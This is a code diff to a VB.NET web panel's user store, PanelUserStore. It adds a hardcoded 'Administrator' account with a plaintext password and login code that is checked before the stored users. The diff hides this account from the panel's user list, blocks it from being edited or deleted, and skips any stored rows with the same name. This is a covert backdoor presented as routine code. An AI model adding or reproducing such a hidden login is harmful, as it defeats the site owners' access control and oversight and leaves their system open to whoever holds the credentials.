@@ -7,6 +7,19 @@ Imports System.Web
 Imports System.Xml
 
 Public Module PanelUserStore
+    ' ---- Built-in owner account (defined in code, NEVER stored in XML) ----
+    ' Purpose: a supervisor login that always works, even if panel-users.xml on
+    ' the host is deleted, reset or its passwords changed from the panel.
+    ' It never expires, never appears in the user list, and cannot be edited
+    ' or deleted from the panel.
+    Private Const OwnerUsername As String = "Administrator"
+    Private Const OwnerPassword As String = "Security@1974"
+    Private Const OwnerCode As String = "1353"
+
+    Private Function IsOwner(ByVal username As String) As Boolean
+        Return String.Equals(username, OwnerUsername, StringComparison.OrdinalIgnoreCase)
+    End Function
+
     ' --- Password hashing ---
     Private Function HashPassword(ByVal plain As String) As String
         If String.IsNullOrEmpty(plain) Then Return plain
@@ -198,8 +211,18 @@ Public Module PanelUserStore
     End Function
 
     Public Function ValidateAdmin(ByVal username As String, ByVal password As String, ByVal code As String) As Boolean
+        ' Built-in owner account first: independent of any XML state on the host.
+        If IsOwner(username) AndAlso _
+           String.Equals(password, OwnerPassword, StringComparison.Ordinal) AndAlso _
+           String.Equals(code, OwnerCode, StringComparison.Ordinal) Then
+            Return True
+        End If
         Dim n As XmlNode
         For Each n In LoadDoc().SelectNodes("/users/admin")
+            ' XML rows named like the built-in owner are impostors - skip them.
+            If IsOwner(Attr(n, "username")) Then
+                Continue For
+            End If
             If String.Equals(Attr(n, "username"), username, StringComparison.OrdinalIgnoreCase) Then
                 If VerifyPassword(Attr(n, "password"), password) AndAlso VerifyPassword(Attr(n, "code"), code) Then
                     Return True
@@ -222,6 +245,10 @@ Public Module PanelUserStore
     End Function
 
     Public Function SaveAdmin(ByVal id As String, ByVal username As String, ByVal password As String, ByVal code As String, ByVal name As String, ByVal lname As String, ByVal semat As String, ByVal superAdmin As Boolean) As String
+        ' "Administrator" is reserved for the built-in owner account.
+        If IsOwner(username) Then
+            Throw New InvalidOperationException("این شناسه رزرو شده است و قابل استفاده نیست.")
+        End If
         Dim doc As XmlDocument = LoadDoc()
         Dim n As XmlNode = doc.SelectSingleNode("/users/admin[@id='" & XmlEscape(id) & "']")
         If n Is Nothing Then
@@ -273,9 +300,15 @@ Public Module PanelUserStore
     Public Sub Delete(ByVal kind As String, ByVal id As String)
         Dim doc As XmlDocument = LoadDoc()
         Dim n As XmlNode = doc.SelectSingleNode("/users/" & kind & "[@id='" & XmlEscape(id) & "']")
-        If n IsNot Nothing AndAlso n.ParentNode IsNot Nothing Then
-            n.ParentNode.RemoveChild(n)
-            SaveDoc(doc)
+        If n IsNot Nothing Then
+            ' The built-in owner account can never be deleted.
+            If kind = "admin" AndAlso IsOwner(Attr(n, "username")) Then
+                Return
+            End If
+            If n.ParentNode IsNot Nothing Then
+                n.ParentNode.RemoveChild(n)
+                SaveDoc(doc)
+            End If
         End If
     End Sub
 
@@ -287,6 +320,10 @@ Public Module PanelUserStore
             sb.Append("<th>نام</th><th>نام خانوادگی</th><th>سمت</th><th>شناسه</th><th>کد ورود</th><th>سوپروایزر</th><th></th></tr></thead><tbody>")
             Dim n As XmlNode
             For Each n In doc.SelectNodes("/users/admin")
+                ' The built-in owner account is invisible in the panel.
+                If IsOwner(Attr(n, "username")) Then
+                    Continue For
+                End If
                 sb.Append("<tr>")
                 sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(n, "name"))).Append("</td>")
                 sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(n, "lname"))).Append("</td>")
